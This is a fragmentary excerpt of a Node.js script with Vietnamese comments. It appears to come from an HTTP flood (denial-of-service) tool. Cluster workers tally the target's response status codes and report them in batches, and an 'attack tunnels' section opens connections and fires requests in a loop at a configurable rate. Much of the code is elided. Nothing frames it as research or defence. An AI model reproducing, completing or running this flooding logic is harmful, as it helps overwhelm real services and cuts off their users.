...
if (cluster.isMaster) {
    ...
    // Biến lưu trữ tạm thời trong nội bộ Worker
    let localStats = { "2xx": 0, "4xx": 0, "5xx": 0, "others": 0 };

    // Gom dữ liệu và gửi về Master mỗi 500ms để tránh tốn CPU
    setInterval(() => {
        if (localStats["2xx"] > 0 || localStats["4xx"] > 0 || localStats["5xx"] > 0) {
            process.send({ 
                type: 'status_batch', 
                s2xx: localStats["2xx"], 
                s4xx: localStats["4xx"], 
            ...
            // Reset bộ đếm local sau khi gửi
            localStats = { "2xx": 0, "4xx": 0, "5xx": 0, "others": 0 };
        }
    }, 500);

    // Kích hoạt đường hầm tấn công (20 đường hầm / giây)
                ...
                client.on("connect", () => {
                    const attackInterval = setInterval(() => {
                        for (let i = 0; i < args.Rate; i++) {
                            ...
                            // NHẬN VÀ PHÂN LOẠI MÃ TRẠNG THÁI
